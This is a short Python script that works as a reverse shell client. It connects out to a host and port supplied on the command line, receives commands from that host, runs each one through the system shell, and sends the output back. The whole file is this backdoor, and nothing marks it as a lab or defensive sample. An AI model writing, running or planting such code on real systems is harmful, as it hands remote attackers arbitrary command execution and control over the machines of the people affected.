#!/usr/bin/python

import socket, subprocess as sp, sys, os
from colorama import Fore, Style, Back

host = str(sys.argv[1])
port = int(sys.argv[2])

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))

command = "aloha"
command = command.encode("utf-8")
conn.send(command)


def close_connection(connection):
    conn.close()


while 1:
    command = conn.recv(1024)
    command = command.decode('utf-8')

    if command == "exit()":
        close_connection(conn)
    if command != "exit()":
        sh = sp.Popen(
            command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE
        )

        out, err = sh.communicate()
        result = str(out) + str(err)
        length = str(len(result)).zfill(16)
        
        conn.send((length + result).encode('utf-8'))
    else:
        break
